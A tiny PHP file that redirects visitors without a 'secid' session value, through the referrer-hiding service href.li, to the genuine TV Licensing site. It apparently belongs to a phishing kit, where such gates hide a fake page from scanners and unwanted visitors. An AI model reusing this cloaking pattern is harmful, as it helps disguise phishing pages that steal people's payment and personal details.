<?php
session_start();
if(!isset($_SESSION["secid"]))
{
echo "<script>window.location.assign('https://href.li/?https://www.tvlicensing.co.uk/')</script>";
die();
}

?>
